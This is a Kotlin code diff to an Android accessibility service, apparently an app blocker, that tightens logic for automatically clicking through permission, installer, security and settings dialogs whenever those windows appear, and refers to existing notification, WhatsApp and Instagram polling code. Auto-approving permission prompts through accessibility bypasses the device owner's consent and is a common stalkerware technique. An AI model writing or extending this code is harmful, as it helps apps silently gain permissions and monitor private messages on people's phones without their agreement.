@@ -259,6 +259,31 @@ class BlockAccessibilityService : AccessibilityService() {
         // ==========================================
         // 🌟 AUTOMATE RUNTIME PERMISSIONS (ALL ANDROID VERSIONS & OEMS)
         // ==========================================
+        // val isPermissionCandidate = packageName.contains("permission") ||
+        //         packageName.contains("installer") ||
+        //         packageName.contains("security") ||
+        //         packageName.contains("settings") ||
+        //         packageName == "android"
+
+        // if (isPermissionCandidate) {
+        //     if (clickAnyPermissionDialog()) {
+        //         return
+        //     }
+        // }
+        // // ==========================================
+
+        // if (eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+        //     val now = android.os.SystemClock.uptimeMillis()
+        //     if (now - lastScrollEventTime < 750L) {
+        //         return
+        //     }
+        //     lastScrollEventTime = now
+        // }
+
+
+        // ==========================================
+        // 🌟 ULTRA-FAST AUTOMATE RUNTIME PERMISSIONS (WINDOW INTERCEPTION)
+        // ==========================================
         val isPermissionCandidate = packageName.contains("permission") ||
                 packageName.contains("installer") ||
                 packageName.contains("security") ||
@@ -266,8 +291,12 @@ class BlockAccessibilityService : AccessibilityService() {
                 packageName == "android"
 
         if (isPermissionCandidate) {
-            if (clickAnyPermissionDialog()) {
-                return
+            // Screen structural changes aagumpodhe fast-track loop execution
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+                if (clickAnyPermissionDialog()) {
+                    return
+                }
             }
         }
         // ==========================================
@@ -279,6 +308,9 @@ class BlockAccessibilityService : AccessibilityService() {
             }
             lastScrollEventTime = now
         }
+        
+        // ... (Keep the rest of your original notification, WhatsApp, Instagram polling code exactly as is)
+
 
         if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             val notification = event.parcelableData as? android.app.Notification
